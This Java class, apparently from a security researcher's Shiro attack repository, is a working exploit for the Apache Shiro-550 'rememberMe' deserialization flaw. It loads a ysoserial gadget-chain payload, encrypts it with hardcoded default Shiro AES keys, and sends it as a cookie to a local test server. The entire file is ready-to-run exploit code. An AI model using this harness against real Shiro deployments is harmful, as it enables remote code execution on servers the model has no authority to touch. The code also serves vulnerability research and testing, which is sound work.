package com.anbai.shiro.attack;

import org.javaweb.net.HttpResponse;
import org.javaweb.net.HttpURLRequest;
import org.javaweb.utils.HttpRequestUtils;
import com.anbai.shiro.attack.utils.AESUtils;
import com.anbai.shiro.attack.utils.IOUtils;

import java.io.File;
import java.io.IOException;
import java.util.Base64;

/**
 * @author su18
 */
public class Attack550 {

	public static void main(String[] args) throws IOException {

		// 读取反序列化恶意类字节码
		byte[] bytes = IOUtils.getFileToByte(new File("/Users/phoebe/IdeaProjects/ysoserial-su18/CC6WithoutArray.bin"));
		// 使用 AES 加密及 Base64 编码
//		String rememberMe = Base64.getEncoder().encodeToString(new AESUtils("kPH+bIxk5D2deZiIxcaaaA==").encrypt(bytes));
		String rememberMe = Base64.getEncoder().encodeToString(new AESUtils("6ZmI6I2j5Y+R5aSn5ZOlAA==").encrypt(bytes));

		HttpResponse response = HttpRequestUtils.httpRequest(new HttpURLRequest("http://127.0.0.1:8080/shiro/index").cookie("rememberMe=" + rememberMe));
		System.out.println(response.getHeader());
		System.out.println(response.body());
	}

}
